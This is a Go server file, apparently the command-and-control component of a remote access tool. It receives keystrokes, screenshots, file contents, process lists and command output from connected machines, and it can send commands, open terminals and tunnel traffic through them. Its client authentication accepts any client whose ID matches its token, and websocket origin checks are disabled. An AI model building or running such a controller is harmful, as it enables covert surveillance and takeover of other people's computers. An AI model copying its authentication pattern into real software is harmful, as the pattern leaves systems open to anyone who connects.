package server

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"log"
	"net/http"
	"sync"
	"time"

	"mww2.com/server_manager/common"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	CheckOrigin: func(r *http.Request) bool {
		return true // In production, implement proper origin checking
	},
}

// Server represents the main server
type Server struct {
	manager            *ClientManager
	store              *ClientStore
	config             *Config
	authenticator      *Authenticator
	webHandler         *WebHandler
	terminalProxy      *TerminalProxy
	proxyManager       *ProxyManager
	commandResults     map[string]*common.CommandResultPayload
	fileListResults    map[string]*common.FileListPayload
	driveListResults   map[string]*common.DriveListPayload
	fileDataResults    map[string]*common.FileDataPayload
	screenshotResults  map[string]*common.ScreenshotDataPayload
	processListResults map[string]*common.ProcessListPayload
	resultsMu          sync.RWMutex
	httpServer         *http.Server
	serverMu           sync.Mutex
	started            bool
	startedMu          sync.Mutex
}

// Config holds server configuration
type Config struct {
	Address     string
	CertFile    string
	KeyFile     string
	AuthToken   string
	UseTLS      bool
	WebUsername string
	WebPassword string
}

// NewServer creates a new server instance
func NewServer(config *Config) *Server {
	manager := NewClientManager()
	sessionMgr := NewSessionManager(24 * time.Hour)
	terminalProxy := NewTerminalProxy(manager, sessionMgr)

	// Initialize client store
	store, err := NewClientStore("clients.db")
	if err != nil {
		log.Printf("ERROR: Failed to create client store: %v", err)
		log.Println("Server will continue without persistent storage")
		store = nil // Continue without store
	}

	webConfig := &WebConfig{
		Username: config.WebUsername,
		Password: config.WebPassword,
	}

	webHandler, err := NewWebHandler(sessionMgr, manager, store, webConfig)
	if err != nil {
		log.Printf("ERROR: Failed to create web handler: %v", err)
		log.Println("Server will continue with limited web functionality")
		// Create a minimal web handler or continue without it
	}

	server := &Server{
		manager:            manager,
		store:              store,
		config:             config,
		authenticator:      NewAuthenticator(config.AuthToken),
		webHandler:         webHandler,
		terminalProxy:      terminalProxy,
		commandResults:     make(map[string]*common.CommandResultPayload),
		fileListResults:    make(map[string]*common.FileListPayload),
		driveListResults:   make(map[string]*common.DriveListPayload),
		fileDataResults:    make(map[string]*common.FileDataPayload),
		screenshotResults:  make(map[string]*common.ScreenshotDataPayload),
		processListResults: make(map[string]*common.ProcessListPayload),
	}

	// Set server reference in web handler
	webHandler.server = server

	// Set store reference in manager for merged client list
	manager.SetStore(store)

	return server
}

// NewServerWithRecovery creates a new server with error recovery
func NewServerWithRecovery(config *Config) (*Server, error) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED during server creation: %v", r)
		}
	}()

	return NewServer(config), nil
}

// Shutdown gracefully shuts down the server
func (s *Server) Shutdown(ctx context.Context) error {
	log.Println("Initiating graceful shutdown...")

	s.startedMu.Lock()
	s.started = false
	s.startedMu.Unlock()

	s.serverMu.Lock()
	httpServer := s.httpServer
	s.serverMu.Unlock()

	// Shutdown HTTP server if running
	if httpServer != nil {
		log.Println("Shutting down HTTP server...")
		if err := httpServer.Shutdown(ctx); err != nil {
			log.Printf("Error shutting down HTTP server: %v", err)
			// Force close if graceful shutdown fails
			httpServer.Close()
		}
	}

	// Close all client connections
	clients := s.manager.GetAllClients()
	for _, client := range clients {
		log.Printf("Closing connection to client: %s", client.ID)
		client.Conn.Close()
	}

	// Close database if available
	if s.store != nil {
		if err := s.store.Close(); err != nil {
			log.Printf("Error closing database: %v", err)
		}
	}

	log.Println("Graceful shutdown complete")
	return nil
} // Start starts the server
func (s *Server) Start() error {
	// Prevent duplicate starts
	s.startedMu.Lock()
	if s.started {
		log.Println("Server already started, skipping duplicate start")
		s.startedMu.Unlock()
		return nil
	}
	s.started = true
	s.startedMu.Unlock()

	go s.manager.Run()

	// Start background task to mark offline clients
	go s.monitorClientStatus()

	// Load previously saved clients from database
	go s.loadSavedClients()

	// Load previously saved proxies from database
	go s.loadSavedProxies()

	mux := http.NewServeMux()

	// WebSocket endpoint for clients
	mux.HandleFunc("/ws", s.handleWebSocket)

	// API endpoints
	mux.HandleFunc("/api/clients", s.webHandler.HandleClientsAPI)
	mux.HandleFunc("/api/command", s.handleSendCommand)
	mux.HandleFunc("/api/terminal", s.terminalProxy.HandleTerminalWebSocket)

	// Proxy API endpoints
	mux.HandleFunc("/api/proxy/create", s.HandleProxyCreate)
	mux.HandleFunc("/api/proxy/list", s.HandleProxyList)
	mux.HandleFunc("/api/proxy/close", s.HandleProxyClose)
	mux.HandleFunc("/api/proxy/suggest", s.HandleProxySuggestPorts)
	mux.HandleFunc("/api/proxy/edit", s.HandleProxyEdit)
	mux.HandleFunc("/api/proxy/stats", s.HandleProxyStats)

	// Client management endpoints
	mux.HandleFunc("/api/client", s.HandleClientGet)
	mux.HandleFunc("/api/client/alias", s.HandleUpdateClientAlias)
	mux.HandleFunc("/api/files", s.HandleFilesAPI)
	mux.HandleFunc("/api/processes", s.HandleProcessesAPI)
	mux.HandleFunc("/api/proxy-file", s.ProxyFileServer)

	// Web UI routes
	s.webHandler.RegisterWebRoutes(mux)

	log.Printf("Server starting on %s", s.config.Address)

	// Only use TLS if explicitly enabled (default is HTTP for nginx reverse proxy)
	if s.config.UseTLS && s.config.CertFile != "" && s.config.KeyFile != "" {
		tlsConfig := &tls.Config{
			MinVersion: tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			},
		}

		server := &http.Server{
			Addr:      s.config.Address,
			Handler:   mux,
			TLSConfig: tlsConfig,
		}

		s.serverMu.Lock()
		s.httpServer = server
		s.serverMu.Unlock()

		log.Printf("Using direct TLS")
		return server.ListenAndServeTLS(s.config.CertFile, s.config.KeyFile)
	}

	// Create HTTP server
	server := &http.Server{
		Addr:    s.config.Address,
		Handler: mux,
	}

	s.serverMu.Lock()
	s.httpServer = server
	s.serverMu.Unlock()

	log.Printf("Using HTTP (TLS should be handled by reverse proxy)")
	return server.ListenAndServe()
}

// getClientIP extracts the real client IP from request headers
func getClientIP(r *http.Request) string {
	// Try X-Forwarded-For first (nginx proxy)
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		// Take the first IP in the list
		if idx := len(xff); idx > 0 {
			if commaIdx := 0; commaIdx < idx {
				for i, c := range xff {
					if c == ',' {
						return xff[:i]
					}
				}
				return xff
			}
		}
	}

	// Try X-Real-IP
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}

	// Fallback to RemoteAddr
	if idx := len(r.RemoteAddr); idx > 0 {
		for i := idx - 1; i >= 0; i-- {
			if r.RemoteAddr[i] == ':' {
				return r.RemoteAddr[:i]
			}
		}
	}
	return r.RemoteAddr
}

// handleWebSocket handles WebSocket connections
func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}

	// Wait for authentication message
	var authMsg common.Message
	err = conn.ReadJSON(&authMsg)
	if err != nil {
		log.Printf("Failed to read auth message: %v", err)
		conn.Close()
		return
	}

	if authMsg.Type != common.MsgTypeAuth {
		log.Printf("Expected auth message, got: %s", authMsg.Type)
		conn.Close()
		return
	}

	var authPayload common.AuthPayload
	err = authMsg.ParsePayload(&authPayload)
	if err != nil {
		log.Printf("Failed to parse auth payload: %v", err)
		conn.Close()
		return
	}

	// Authenticate client - accept machine ID as valid token
	authenticated := authPayload.ClientID == authPayload.Token
	token := authPayload.ClientID

	// Send authentication response
	respPayload := &common.AuthResponsePayload{
		Success: authenticated,
		Token:   token,
	}

	if !authenticated {
		respPayload.Message = "Authentication failed"
		respMsg, _ := common.NewMessage(common.MsgTypeAuthResponse, respPayload)
		conn.WriteJSON(respMsg)
		conn.Close()
		return
	}

	respPayload.Message = "Authentication successful"
	respMsg, _ := common.NewMessage(common.MsgTypeAuthResponse, respPayload)
	conn.WriteJSON(respMsg)

	// Get public IP from request headers
	publicIP := getClientIP(r)

	// Create client metadata
	metadata := &common.ClientMetadata{
		ID:          authPayload.ClientID,
		Token:       token,
		OS:          authPayload.OS,
		Arch:        authPayload.Arch,
		Hostname:    authPayload.Hostname,
		IP:          authPayload.IP,
		PublicIP:    publicIP,
		Status:      "online",
		ConnectedAt: time.Now(),
		LastSeen:    time.Now(),
	}

	// Load saved metadata (including alias) if available
	if s.store != nil {
		if savedClient, err := s.store.GetClient(authPayload.ClientID); err == nil && savedClient != nil {
			// Preserve the alias from saved data
			metadata.Alias = savedClient.Alias
		}
	}

	// Create client
	client := &Client{
		ID:       authPayload.ClientID,
		Conn:     conn,
		Metadata: metadata,
		Send:     make(chan *common.Message, 256),
		closed:   false,
	}

	s.manager.register <- client

	// Restore proxies for this client if it was previously configured
	if s.proxyManager == nil {
		s.proxyManager = NewProxyManager(s.manager, s.store)
	}
	go s.proxyManager.RestoreProxiesForClient(client.ID)

	// Start goroutines for reading and writing
	go s.readPump(client)
	go s.writePump(client)
}

// readPump reads messages from the client
func (s *Server) readPump(client *Client) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in readPump for client %s: %v", client.ID, r)
		}
		s.manager.unregister <- client
		client.Conn.Close()
	}()

	client.Conn.SetReadDeadline(time.Now().Add(90 * time.Second))
	client.Conn.SetPongHandler(func(string) error {
		client.Conn.SetReadDeadline(time.Now().Add(90 * time.Second))
		return nil
	})

	for {
		// First, read as raw JSON to check the message type
		var rawMsg map[string]interface{}
		err := client.Conn.ReadJSON(&rawMsg)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket error: %v", err)
			}
			break
		}

		// Update last seen
		s.manager.UpdateClientMetadata(client.ID, func(m *common.ClientMetadata) {
			m.LastSeen = time.Now()
		})

		// Check if this is a proxy message
		if msgType, ok := rawMsg["type"].(string); ok {
			switch msgType {
			case "proxy_data":
				// Handle proxy data message
				proxyID, _ := rawMsg["proxy_id"].(string)
				userID, _ := rawMsg["user_id"].(string)

				// Data is base64 encoded string
				var data []byte
				if dataVal, ok := rawMsg["data"]; ok {
					if dataStr, ok := dataVal.(string); ok {
						// Decode from base64
						decodedData, err := base64.StdEncoding.DecodeString(dataStr)
						if err != nil {
							log.Printf("Error decoding base64 proxy data: %v", err)
							data = []byte(dataStr) // Fallback to raw string if not valid base64
						} else {
							data = decodedData
						}
					}
				}

				if s.proxyManager != nil && proxyID != "" && userID != "" {
					if err := s.proxyManager.HandleProxyDataFromClient(proxyID, userID, data); err != nil {
						log.Printf("Error handling proxy data: %v", err)
					}
				}
				continue

			case "proxy_disconnect":
				// Handle proxy disconnect message - user closed the connection
				proxyID, _ := rawMsg["proxy_id"].(string)
				userID, _ := rawMsg["user_id"].(string)

				if s.proxyManager != nil && proxyID != "" && userID != "" {
					if err := s.proxyManager.HandleProxyDisconnect(proxyID, userID); err != nil {
						log.Printf("Error handling proxy disconnect: %v", err)
					}
				}
				continue
			}
		}

		// Not a proxy message, parse as common.Message
		jsonData, _ := json.Marshal(rawMsg)
		var msg common.Message
		if err := json.Unmarshal(jsonData, &msg); err != nil {
			log.Printf("Failed to parse message from %s: %v", client.ID, err)
			continue
		}

		// Handle message
		s.handleMessage(client, &msg)
	}
}

// writePump writes messages to the client
func (s *Server) writePump(client *Client) {
	ticker := time.NewTicker(30 * time.Second)
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in writePump for client %s: %v", client.ID, r)
		}
		ticker.Stop()
		client.Conn.Close()
	}()

	for {
		select {
		case message, ok := <-client.Send:
			client.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if !ok {
				client.Conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			err := client.Conn.WriteJSON(message)
			if err != nil {
				return
			}

		case <-ticker.C:
			client.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := client.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}

// handleMessage handles incoming messages from clients
func (s *Server) handleMessage(client *Client, msg *common.Message) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in handleMessage for client %s: %v", client.ID, r)
		}
	}()

	switch msg.Type {
	case common.MsgTypeHeartbeat:
		var hb common.HeartbeatPayload
		if err := msg.ParsePayload(&hb); err == nil {
			s.manager.UpdateClientMetadata(client.ID, func(m *common.ClientMetadata) {
				m.Status = hb.Status
				m.LastHeartbeat = time.Now()
			})
		}

	case common.MsgTypeCommandResult:
		var cr common.CommandResultPayload
		if err := msg.ParsePayload(&cr); err == nil {
			log.Printf("Command result from %s: success=%v, exit_code=%d", client.ID, cr.Success, cr.ExitCode)
			s.resultsMu.Lock()
			s.commandResults[client.ID] = &cr
			s.resultsMu.Unlock()
		} else {
			log.Printf("Command result from %s: %s", client.ID, string(msg.Payload))
		}

	case common.MsgTypeFileList:
		var fl common.FileListPayload
		if err := msg.ParsePayload(&fl); err == nil {
			log.Printf("File list from %s: %d files", client.ID, len(fl.Files))
			s.resultsMu.Lock()
			s.fileListResults[client.ID] = &fl
			s.resultsMu.Unlock()
		} else {
			log.Printf("File list from %s", client.ID)
		}

	case common.MsgTypeDriveList:
		var dl common.DriveListPayload
		if err := msg.ParsePayload(&dl); err == nil {
			log.Printf("Drive list from %s: %d drives", client.ID, len(dl.Drives))
			s.resultsMu.Lock()
			s.driveListResults[client.ID] = &dl
			s.resultsMu.Unlock()
		} else {
			log.Printf("Drive list from %s", client.ID)
		}

	case common.MsgTypeProcessList:
		var pl common.ProcessListPayload
		if err := msg.ParsePayload(&pl); err == nil {
			log.Printf("Process list from %s: %d processes", client.ID, len(pl.Processes))
			s.resultsMu.Lock()
			s.SetProcessListResult(client.ID, &pl)
			s.resultsMu.Unlock()
		} else {
			log.Printf("Process list from %s", client.ID)
		}

	case common.MsgTypeFileData:
		var fd common.FileDataPayload
		if err := msg.ParsePayload(&fd); err == nil {
			log.Printf("File data from %s: %s (%d bytes)", client.ID, fd.Path, len(fd.Data))
			s.resultsMu.Lock()
			s.fileDataResults[client.ID] = &fd
			s.resultsMu.Unlock()
		} else {
			log.Printf("File data from %s", client.ID)
		}

	case common.MsgTypeScreenshotData:
		var sd common.ScreenshotDataPayload
		if err := msg.ParsePayload(&sd); err == nil {
			log.Printf("Screenshot received from %s: %dx%d, %d bytes", client.ID, sd.Width, sd.Height, len(sd.Data))
			s.resultsMu.Lock()
			s.screenshotResults[client.ID] = &sd
			s.resultsMu.Unlock()
		} else {
			log.Printf("Screenshot received from %s", client.ID)
		}

	case common.MsgTypeKeyloggerData:
		var kld common.KeyloggerDataPayload
		if err := msg.ParsePayload(&kld); err == nil {
			log.Printf("Keylogger data from %s: %s", client.ID, kld.Keys)
		}

	case common.MsgTypeUpdateStatus:
		var us common.UpdateStatusPayload
		if err := msg.ParsePayload(&us); err == nil {
			log.Printf("Update status from %s: %s - %s", client.ID, us.Status, us.Message)
		}

	case common.MsgTypeTerminalOutput:
		var to common.TerminalOutputPayload
		if err := msg.ParsePayload(&to); err == nil {
			s.terminalProxy.HandleTerminalOutput(to.SessionID, to.Data, false)
		}

	case common.MsgTypePong:
		// Heartbeat response

	default:
		log.Printf("Unknown message type from %s: %s", client.ID, msg.Type)
	}
}

// handleGetClients returns list of connected clients
func (s *Server) handleGetClients(w http.ResponseWriter, r *http.Request) {
	clients := s.manager.GetAllClients()
	metadata := make([]*common.ClientMetadata, len(clients))

	for i, client := range clients {
		client.mu.RLock()
		metadata[i] = client.Metadata
		client.mu.RUnlock()
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(metadata)
}

// handleSendCommand sends a command to a specific client
func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string                       `json:"client_id"`
		Command  common.ExecuteCommandPayload `json:"command"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	msg, err := common.NewMessage(common.MsgTypeExecuteCommand, req.Command)
	if err != nil {
		http.Error(w, "Failed to create message", http.StatusInternalServerError)
		return
	}

	if err := s.manager.SendToClient(req.ClientID, msg); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// Wait briefly for response (up to 30 seconds)
	for i := 0; i < 60; i++ {
		time.Sleep(500 * time.Millisecond)
		s.resultsMu.RLock()
		result, exists := s.commandResults[req.ClientID]
		s.resultsMu.RUnlock()

		if exists {
			// Clear the result after reading
			s.resultsMu.Lock()
			delete(s.commandResults, req.ClientID)
			s.resultsMu.Unlock()

			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"status":  "completed",
				"success": result.Success,
				"output":  result.Output,
				"error":   result.Error,
			})
			return
		}
	}

	// Timeout - command sent but no response yet
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "sent"})
}

// GetFileListResult retrieves stored file list result for a client
func (s *Server) GetFileListResult(clientID string) (*common.FileListPayload, bool) {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	result, exists := s.fileListResults[clientID]
	return result, exists
}

// ClearFileListResult removes stored file list result
func (s *Server) ClearFileListResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.fileListResults, clientID)
}

// GetDriveListResult retrieves stored drive list result for a client
func (s *Server) GetDriveListResult(clientID string) (*common.DriveListPayload, bool) {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	result, exists := s.driveListResults[clientID]
	return result, exists
}

// ClearDriveListResult removes stored drive list result
func (s *Server) ClearDriveListResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.driveListResults, clientID)
}

// GetScreenshotResult retrieves stored screenshot result for a client
func (s *Server) GetScreenshotResult(clientID string) (*common.ScreenshotDataPayload, bool) {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	result, exists := s.screenshotResults[clientID]
	return result, exists
}

// ClearScreenshotResult removes stored screenshot result
func (s *Server) ClearScreenshotResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.screenshotResults, clientID)
}

// GetFileDataResult retrieves stored file data result for a client
func (s *Server) GetFileDataResult(clientID string) (*common.FileDataPayload, bool) {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	result, exists := s.fileDataResults[clientID]
	return result, exists
}

// ClearFileDataResult removes stored file data result
func (s *Server) ClearFileDataResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.fileDataResults, clientID)
}

// GetProcessListResult retrieves stored process list result for a client
func (s *Server) GetProcessListResult(clientID string) (*common.ProcessListPayload, bool) {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	result, exists := s.processListResults[clientID]
	return result, exists
}

// SetProcessListResult stores process list result for a client
func (s *Server) SetProcessListResult(clientID string, payload *common.ProcessListPayload) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	s.processListResults[clientID] = payload
}

// ClearProcessListResult removes stored process list result
func (s *Server) ClearProcessListResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.processListResults, clientID)
}

// clearCachedClientData removes any cached result blobs for a client
func (s *Server) clearCachedClientData(clientID string) {
	s.resultsMu.Lock()
	delete(s.commandResults, clientID)
	delete(s.fileListResults, clientID)
	delete(s.driveListResults, clientID)
	delete(s.fileDataResults, clientID)
	delete(s.screenshotResults, clientID)
	delete(s.processListResults, clientID)
	s.resultsMu.Unlock()
}

// monitorClientStatus monitors client status and updates database
func (s *Server) monitorClientStatus() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in monitorClientStatus: %v", r)
			log.Println("Restarting client status monitor...")
			time.Sleep(5 * time.Second)
			go s.monitorClientStatus() // Restart the monitor
		}
	}()

	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		// Save all currently connected clients to database
		clients := s.manager.GetClients()
		for _, metadata := range clients {
			if err := s.store.SaveClient(metadata); err != nil {
				log.Printf("Error saving client %s: %v", metadata.ID, err)
			}
		}

		// Mark clients as offline if not seen recently (2 minutes)
		if err := s.store.MarkOffline(2 * time.Minute); err != nil {
			log.Printf("Error marking offline clients: %v", err)
		}
	}
}

// loadSavedClients loads previously saved clients from database on startup
func (s *Server) loadSavedClients() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in loadSavedClients: %v", r)
		}
	}()

	if s.store == nil {
		log.Println("Client store not available, skipping load from database")
		return
	}

	log.Println("Loading saved clients from database...")
	clients, err := s.store.GetAllClients()
	if err != nil {
		log.Printf("Error loading saved clients: %v", err)
		return
	}

	log.Printf("Loaded %d clients from database", len(clients))
	for _, client := range clients {
		log.Printf("  - %s (%s) - %s - Last seen: %s",
			client.ID, client.Hostname, client.Status, client.LastSeen.Format(time.RFC3339))
	}
}

// loadSavedProxies loads previously saved proxies from database on startup
func (s *Server) loadSavedProxies() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in loadSavedProxies: %v", r)
		}
	}()

	if s.store == nil {
		log.Println("Store not available, skipping proxy load from database")
		return
	}

	log.Println("Loading saved proxies from database...")

	// Initialize proxy manager if not already done
	if s.proxyManager == nil {
		s.proxyManager = NewProxyManager(s.manager, s.store)
	}

	proxies, err := s.store.GetAllProxies()
	if err != nil {
		log.Printf("Error loading saved proxies: %v", err)
		return
	}

	if len(proxies) == 0 {
		log.Println("No saved proxies found in database")
		return
	}

	log.Printf("Found %d saved proxies in database, attempting to restore...", len(proxies))

	successCount := 0
	failCount := 0

	for _, proxy := range proxies {
		// Check if client is available
		client, exists := s.manager.GetClient(proxy.ClientID)
		if !exists {
			log.Printf("  ⚠️  Skipping proxy %s (client %s not currently connected)", proxy.ID, proxy.ClientID)
			failCount++
			continue
		}

		if client.Conn == nil {
			log.Printf("  ⚠️  Skipping proxy %s (client %s WebSocket not ready)", proxy.ID, proxy.ClientID)
			failCount++
			continue
		}

		// Try to recreate the proxy
		conn, err := s.proxyManager.CreateProxyConnection(
			proxy.ClientID,
			proxy.RemoteHost,
			proxy.RemotePort,
			proxy.LocalPort,
			proxy.Protocol,
		)

		if err != nil {
			log.Printf("  ❌ Failed to restore proxy %s: %v", proxy.ID, err)
			failCount++
			continue
		}

		log.Printf("  ✅ Restored proxy: :%d -> %s:%d (client: %s, protocol: %s)",
			conn.LocalPort, conn.RemoteHost, conn.RemotePort, conn.ClientID, conn.Protocol)
		successCount++
	}

	log.Printf("Proxy restore complete: %d restored, %d skipped/failed", successCount, failCount)
	log.Printf("Note: Proxies will be auto-restored when their clients reconnect")
}
